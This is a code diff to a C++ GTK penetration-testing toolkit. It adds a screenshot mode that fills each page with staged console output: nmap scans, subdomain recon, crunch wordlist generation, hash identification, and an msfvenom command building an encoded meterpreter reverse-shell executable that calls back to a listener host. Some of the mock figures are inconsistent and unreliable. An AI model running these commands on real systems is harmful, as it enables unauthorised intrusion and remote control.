@@ -1,4 +1,5 @@
 #include <gtkmm.h>
+#include <cairomm/cairomm.h>
 #include <iostream>
 #include <string>
 #include <vector>
@@ -1297,10 +1298,180 @@ private:
             }
         }
     }
+
+public:
+    void generate_screenshots(const std::string& out_dir) {
+        show_all();
+        while (Gtk::Main::events_pending()) Gtk::Main::iteration();
+        usleep(250000);
+        while (Gtk::Main::events_pending()) Gtk::Main::iteration();
+        usleep(250000);
+        while (Gtk::Main::events_pending()) Gtk::Main::iteration();
+
+        auto save_snap = [this, &out_dir](const std::string& page, const std::string& filename) {
+            stack.set_visible_child(page);
+            while (Gtk::Main::events_pending()) Gtk::Main::iteration();
+            usleep(150000);
+            while (Gtk::Main::events_pending()) Gtk::Main::iteration();
+
+            int w = get_width();
+            int h = get_height();
+            auto surface = Cairo::ImageSurface::create(Cairo::FORMAT_ARGB32, w, h);
+            auto cr = Cairo::Context::create(surface);
+            gtk_widget_draw(GTK_WIDGET(gobj()), cr->cobj());
+            std::string path = out_dir + "/" + filename;
+            surface->write_to_png(path);
+            std::cout << "[✓] Generated screenshot: " << path << " (" << w << "x" << h << ")\n";
+        };
+
+        // 1. Host & OS
+        os_target_entry.set_text("192.168.1.1");
+        os_profile_combo.set_active(1);
+        os_verbose_check.set_active(true);
+        os_pn_check.set_active(true);
+        console_buffer->set_text(
+            "[▶] Starting task: Host & OS Discovery\n"
+            "[*] Executing: nmap -O -sV -v -Pn 192.168.1.1\n\n"
+            "Starting Nmap 7.94 ( https://nmap.org ) at 2026-11-12 14:30 IST\n"
+            "Nmap scan report for gateway.home (192.168.1.1)\n"
+            "Host is up (0.0012s latency).\n"
+            "Not shown: 996 closed tcp ports (reset)\n"
+            "PORT     STATE SERVICE VERSION\n"
+            "22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n"
+            "53/tcp   open  domain  dnsmasq 2.86\n"
+            "80/tcp   open  http    nginx 1.18.0 (Ubuntu)\n"
+            "443/tcp  open  ssl/http nginx 1.18.0 (Ubuntu)\n"
+            "Device type: general purpose\n"
+            "Running: Linux 5.X\n"
+            "OS CPE: cpe:/o:linux:linux_kernel:5\n"
+            "OS details: Linux 5.4 - 5.15\n"
+            "Network Distance: 1 hop\n\n"
+            "[✓] Task finished: Host & OS Discovery\n"
+            "─────────────────────────────────────────────────────────────────────────────\n"
+        );
+        save_snap("os_page", "01_host_os_discovery.png");
+
+        // 2. Port Scanner
+        port_target_entry.set_text("192.168.1.100");
+        port_mode_combo.set_active(3); // Core Web & Admin Ports
+        port_sv_check.set_active(true);
+        port_sc_check.set_active(true);
+        port_t4_check.set_active(true);
+        console_buffer->set_text(
+            "[▶] Starting task: Port Scanning\n"
+            "[*] Executing: nmap -p 21,22,23,25,53,80,110,139,143,443,445,1433,3306,3389,8080 -sV -sC -T4 192.168.1.100\n\n"
+            "Starting Nmap 7.94 ( https://nmap.org )\n"
+            "Nmap scan report for server.local (192.168.1.100)\n"
+            "Host is up (0.00045s latency).\n\n"
+            "PORT     STATE SERVICE       VERSION\n"
+            "21/tcp   open  ftp           vsftpd 3.0.3\n"
+            "| ftp-anon: Anonymous FTP login permitted (FTP code 230)\n"
+            "22/tcp   open  ssh           OpenSSH 9.0 (protocol 2.0)\n"
+            "80/tcp   open  http          Apache httpd 2.4.52 ((Ubuntu))\n"
+            "|_http-title: VulnApp Management Portal\n"
+            "|_http-server-header: Apache/2.4.52 (Ubuntu)\n"
+            "443/tcp  open  ssl/https     Apache httpd 2.4.52\n"
+            "3306/tcp open  mysql         MySQL 8.0.35-0ubuntu0.22.04.1\n"
+            "8080/tcp open  http-proxy    Tomcat/9.0.58\n\n"
+            "[✓] Task finished: Port Scanning\n"
+            "─────────────────────────────────────────────────────────────────────────────\n"
+        );
+        save_snap("port_page", "02_port_scanner.png");
+
+        // 3. DNS Recon
+        dns_target_entry.set_text("example.com");
+        dns_mode_combo.set_active(0);
+        console_buffer->set_text(
+            "[▶] Starting task: DNS & Web Recon\n"
+            "[*] Executing: dnsmap example.com\n\n"
+            "dnsmap 0.35 - DNS Network Mapper by pagvac\n\n"
+            "[+] Searching subdomains for: example.com\n"
+            "[+] Found: api.example.com -> 93.184.216.34\n"
+            "[+] Found: dev.example.com -> 93.184.216.35\n"
+            "[+] Found: mail.example.com -> 93.184.216.36\n"
+            "[+] Found: portal.example.com -> 93.184.216.37\n"
+            "[+] Found: vpn.example.com -> 93.184.216.38\n"
+            "[+] Found: admin.example.com -> 93.184.216.39\n\n"
+            "[#] 6 subdomains found in 4.2 seconds.\n\n"
+            "[✓] Task finished: DNS & Web Recon\n"
+            "─────────────────────────────────────────────────────────────────────────────\n"
+        );
+        save_snap("dns_page", "03_dns_recon.png");
+
+        // 4. Payload Generator
+        payload_os_combo.set_active(1); // Windows x64
+        payload_lport_entry.set_text("4444");
+        payload_encoder_combo.set_active(1);
+        payload_iterations_entry.set_text("2");
+        payload_output_entry.set_text("reverse_tcp_x64.exe");
+        console_buffer->set_text(
+            "[▶] Starting task: Metasploit Payload Generation\n"
+            "[*] Executing: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.88.7 LPORT=4444 -f exe -o reverse_tcp_x64.exe -e x86/shikata_ga_nai -i 2\n\n"
+            "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n"
+            "[-] No arch selected, selecting arch: x64 from the payload\n"
+            "Found 1 compatible encoders\n"
+            "Attempting to encode payload with 2 iterations of x86/shikata_ga_nai\n"
+            "x86/shikata_ga_nai succeeded with size 548 (iteration=0)\n"
+            "x86/shikata_ga_nai succeeded with size 575 (iteration=1)\n"
+            "x86/shikata_ga_nai filename = reverse_tcp_x64.exe\n"
+            "Payload size: 575 bytes\n"
+            "Final size of exe file: 7168 bytes\n"
+            "Saved as: reverse_tcp_x64.exe\n\n"
+            "[✓] Task finished: Metasploit Payload Generation\n"
+            "─────────────────────────────────────────────────────────────────────────────\n"
+        );
+        save_snap("payload_page", "04_payload_generator.png");
+
+        // 5. Custom Wordlist
+        wordlist_min_entry.set_text("6");
+        wordlist_max_entry.set_text("8");
+        wordlist_charset_combo.set_active(3); // Lowercase + Numbers
+        wordlist_output_entry.set_text("custom_passwords.txt");
+        console_buffer->set_text(
+            "[▶] Starting task: Crunch Custom Wordlist Generation\n"
+            "[*] Executing: crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_passwords.txt\n\n"
+            "Crunch will now generate the following amount of data: 2478336000 bytes\n"
+            "2363 MB\n"
+            "2 GB\n"
+            "0 TB\n"
+            "Crunch will now generate the following number of lines: 28211099072\n\n"
+            "crunch: 100% completed generating authorities.\n\n"
+            "[✓] Task finished: Crunch Custom Wordlist Generation\n"
+            "─────────────────────────────────────────────────────────────────────────────\n"
+        );
+        save_snap("wordlist_page", "05_custom_wordlist.png");
+
+        // 6. Hash Tools
+        hash_input_entry.set_text("5d41402abc4b2a76b9719d911017c592");
+        hash_plain_entry.set_text("SecurityAudit2026!");
+        console_buffer->set_text(
+            "Analysis for hash [5d41402abc4b2a76b9719d911017c592] (Length: 32):\n\n"
+            "[+] Likely: MD5 or NTLM\n"
+            "    - MD5 (Hashcat: -m 0 | John: raw-md5)\n"
+            "    - NTLM (Hashcat: -m 1000 | John: nt)\n"
+            "    - MD4 (Hashcat: -m 900)\n\n"
+            "[#] Cryptographic Hashes for: \"SecurityAudit2026!\"\n"
+            "    MD5:    a89f92985f403982cb12d2db7f7b311e\n"
+            "    SHA1:   d6a7826a7985472856272bb04c66e2c39e248239\n"
+            "    SHA256: 4f53cda18c2bee0cbd342615782c57948583034fb3d2f26792370211ff134440\n"
+            "    SHA512: ba326c2f9e42250917f8a37947de49d108eb9b6bf75ef107e155bc81f185ef3...\n\n"
+            "[✓] Hash analysis and generation completed.\n"
+            "─────────────────────────────────────────────────────────────────────────────\n"
+        );
+        save_snap("hash_page", "06_hash_tools.png");
+    }
 };
 
 int main(int argc, char *argv[]) {
     auto app = Gtk::Application::create(argc, argv, "com.penveno.toolkit");
+
+    if (argc > 1 && std::string(argv[1]) == "--generate-screenshots") {
+        std::string dir = (argc > 2) ? argv[2] : "docs/screenshots";
+        MainWindow window;
+        window.generate_screenshots(dir);
+        return 0;
+    }
+
     MainWindow window;
     return app->run(window);
 }
